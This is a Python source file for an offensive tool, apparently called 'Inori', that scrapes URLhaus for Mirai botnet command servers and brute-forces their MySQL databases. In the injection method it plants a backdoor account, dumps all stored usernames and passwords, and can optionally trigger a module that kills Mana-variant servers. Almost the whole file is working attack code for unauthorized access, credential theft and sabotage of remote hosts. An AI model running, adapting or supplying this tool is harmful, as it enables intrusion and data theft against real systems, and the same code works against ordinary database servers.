from __future__ import annotations


import requests

from concurrent.futures import ThreadPoolExecutor
from pymysql            import connect
from csv                import reader
from json               import load, dump
from time               import time


from argparse import(
    ArgumentParser,
    BooleanOptionalAction
)

from lib.constants import(
    SQL_FILTER,
    SQL_ERRORS,
    BANNER, 
    INORI,
    MANA,
    TAGS
)

from modules.killer import ManaKiller
from lib.colors     import Colors



class Inori:
    def __init__(self: Inori, threads: int, killer_enabled: bool) -> None:
        self.threads: int = threads

        if not self.threads:
            raise RuntimeError('please use the arg (-t <number of threads>)')
        
        self.combos: list = open('lib/creds.txt').readlines()
        self.kill_enabled: bool = killer_enabled
        self.killer: ManaKiller = ManaKiller()

        self.results: list = []
        self.ip_list: list = self.urlhaus()


    ##########################################################################
    '''STATIC METHODS.'''

    @staticmethod    
    def update_db(entry: dict) -> bool | None: 
        """Update database with our new entry
        Args:
            Entry(dict): Entry(pwned cnc server with extra info) 
                         that is gonna put in database.json

        Returns: 
            bool
        """
        with open('database.json','r+') as database_file:
            file_data: dict = load(database_file)
            
            if not entry in file_data['results_database']:
                file_data['results_database'].append(entry)

                database_file.seek(0)
                dump(file_data, database_file, indent = 4)

                return True
            
            return False



    @staticmethod
    def urlhaus() -> list[str, ...]: # type: ignore
        """Scrape URLHAUS for Mirai CNC's.

        Return: 
            list(str, ...): List containing all server IP's from database.
        """
        all_servers: list = []
        cache:       list = [] # Store IP addresses here (to not get doubles)
            
        for endpoint in ('recent','online'):
            mirai_list: list = reader(
                requests.get(
                    url = f'https://urlhaus.abuse.ch/downloads/csv_{endpoint}/'
                ).text.split('\n')
            )
            for line in mirai_list:
                try:
                    # NOTE: Just to read the line better 
                    # NOTE: and hint for the key words without parsing
                    # NOTE: (some items may not be arranged in the right order)
                    line_str: str = ','.join(line)
                    if len(line) != 0 and tuple(tag for tag in TAGS if tag in line_str):
                        ip:   str = str(line).split('/')[2]
                        arch: str = f'{str(line).split("/")[3]}/{str(line).split("/")[4]}'.split("',")[0]
                            
                        if ip.count('.') == 3:
                            if ip not in cache:
                                cache.append(ip)
                                    
                                if ':' in ip:
                                    data: dict = {
                                        'ip'  : ip[:ip.index(':')],
                                        'arch': arch
                                    }
                                else:
                                    data: dict = {
                                        'ip'  : ip,
                                        'arch': arch
                                    }
                                        
                                if data not in all_servers:
                                    all_servers.append(data)
                except:
                    continue

        return all_servers


    ##########################################################################
    '''INORI METHODS.'''

    def fire(self: Inori) -> None:
        """Main function that starts each thread.

        Return: 
            None
        """
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            [executor.submit(self.execution) for _ in range(self.threads)]


    def execution(self: Inori) -> None:
        """Thread that cycles through the list
           and selects one entry at a time (each thread).

        Returns: 
            None
        """

        '''Proper cycle system.'''
        while self.ip_list:
            # NOTE: List empty? kill thread.

            # NOTE: cycle through entire list.
            for cnc_server in self.ip_list:
                if cnc_server in self.ip_list:
                    try:
                        # NOTE: Entry gets deleted (prevents repetition)
                        self.ip_list.remove(cnc_server)
                    except IndexError:
                        continue

                self.injection(cnc_server)



    def injection(self: Inori, cnc_server: dict) -> None:
        """Inject our custom login into the SQL Server
           if login was a success.

        Args:
            cnc_server(dict): The entry being updated (Contains: ip, arch, etc...).
            
        Returns: 
            None
        """

        for cred in self.combos:
            username, _, password = cred.strip().partition(':')
            try:
                # NOTE: Attempt to login SQL server.
                with connect(user = username, password = password, host = cnc_server['ip'], connect_timeout = 5, write_timeout = 5, read_timeout = 5) as conn:
                    database_lists: list = []
                    # NOTE: If log in was a success then update the 
                    # NOTE: cnc_server dictionary with login credentials used.
                    cnc_server.update({'mysql_login': f'{username}:{password}'})
                    cursor = conn.cursor()
                                
                    # NOTE: Attempt to show all the databases in the SQL server.
                    cursor.execute('show databases')
                                
                                
                    # NOTE: Check each database for the users table.
                    for db in [db[0] for db in cursor.fetchall() if not [filt for filt in SQL_FILTER if filt in db[0]]]:
                        cursor.execute(f'use {db};')
                                    
                        try:
                            # NOTE: Inject our custom login into the users table.
                            cursor.execute(f"INSERT INTO users VALUES (NULL, 'inori', 'lmaowtf', 0, 0, 0, 0, -1, 1, 30, '');")
                            # NOTE: Select users table so we can 
                            # NOTE: dump the credentials out.
                            cursor.execute('SELECT * from users')
                        except:
                            # NOTE: users table was not found (failed to inject to and select the table).
                            database_lists.append({db : ['Users table not found.']})
                            continue
                                    
                        database_creds: list = [] # Database credentials get saved here.
                        # NOTE: Dump all the credentials in the database. (users table was found)
                        for row in cursor.fetchall():
                            if row[1] and row[2] and not f'{row[1]}:{row[2]}' in database_creds:
                                database_creds.append(f'{row[1]}:{row[2]}')
                                                            
                        database_lists.append({db : database_creds})  

                                
                    # NOTE: Update our dictionary with all the databases & credentials.      
                    cnc_server.update({'databases': database_lists})
                    # NOTE: Save entry to self.results (objects results)
                    self.results.append(cnc_server)
                            
                    # NOTE: Print out the successful results as we go along.
                    print(f"""{Colors.LIME}• {INORI} {Colors.WHITE}has logged in {Colors.PINKRED}{cnc_server['ip']} {Colors.WHITE}({Colors.LIGHTPINK}{cnc_server['mysql_login']}{Colors.WHITE}) {Colors.WHITE}({Colors.LIGHTPINK}{cnc_server['arch']}{Colors.WHITE})""")
                    print(f' {Colors.LIGHTPINK}• {Colors.WHITE}Dumping databases...')
                    if cnc_server['databases']:
                        for database in cnc_server['databases']:
                            for db, creds in database.items():
                                print(f'   {Colors.PINKRED}• {Colors.LIGHTPINK}{db}{Colors.WHITE}: {Colors.PINKRED}{f"{Colors.WHITE},{Colors.PINKRED} ".join(creds)}')
                    else:
                        print(f'  {Colors.RED}• {Colors.WHITE}No database found.')
                                
                                
                    self.killer.addr: str = cnc_server['ip']
                    # NOTE: Detect whether the CNC is a Mana V4 source.
                    if self.killer.verify_mana(cnc_server['arch']):
                        print(f'{Colors.LIME}• {MANA} {Colors.WHITE}source detected!')
                                
                        if self.kill_enabled:
                            # NOTE: Kill the CNC.
                            if self.killer.execute():
                                print(f'    {Colors.LIME}• {Colors.WHITE}Killed {MANA} {Colors.WHITE}source!')
                            else:
                                print(f'    {Colors.RED}• {Colors.WHITE}Failed to kill {MANA} {Colors.WHITE}source.')
                    else:
                        print(f'{Colors.RED}• {Colors.WHITE}No {MANA} {Colors.WHITE}source detected.')
                                        
                                
                    # NOTE: Update local results database (database.json).    
                    if self.update_db(cnc_server):
                        print(f'{Colors.LIME}• {Colors.WHITE}Query added to local results database.\n')
                    else:
                        print(f'{Colors.RED}• {Colors.WHITE}Query already in local results database.\n')
                                    
                    return
            except Exception as e:
                # NOTE: Prevent multiple attempts of trying different
                # NOTE: credentials on a server that isnt online.
                if tuple(error for error in SQL_ERRORS if error in e.args[1]):
                    break

                continue






if __name__  == '__main__':
    parser = ArgumentParser()
    
    parser.add_argument(
        '-t',
        '--threads',
        help   = 'Select amount of threads to use for Inori.',
        type   = int,
    )

    parser.add_argument(
        '-k',
        '--killer',
        help    = 'Activate Mana killer.',
        type    = bool,
        action  = BooleanOptionalAction,
        default = False
    )

    arguments = parser.parse_args()

    ##############################################################
    ##############################################################
    """Program starts here."""
    
    print(f'\x1bc{BANNER}')

    session: Inori = Inori(
        threads = arguments.threads, 
        killer_enabled = arguments.killer
    )
    print(f'{Colors.WHITE}Scraped {Colors.LIGHTPINK}{len(session.ip_list)} {Colors.WHITE}IP Addresses')
    print(f'{Colors.LIGHTPINK}• {Colors.WHITE}{MANA} {Colors.WHITE}Killer enabled: {Colors.LIGHTPINK}{arguments.killer}{Colors.WHITE}\n')
    start: int = time()

    print(f'{Colors.WHITE}Executing {INORI}{Colors.WHITE}...\n')
    session.fire()

    print(f'{Colors.WHITE}Found {Colors.LIME}{len(session.results)} {Colors.PINKRED}mirai {Colors.WHITE}CNC(s)\n')
    print(f'{Colors.WHITE}Execution speed: {Colors.LIGHTPINK}{str(time() - start).split(".")[0]} {Colors.WHITE}seconds.\n') 
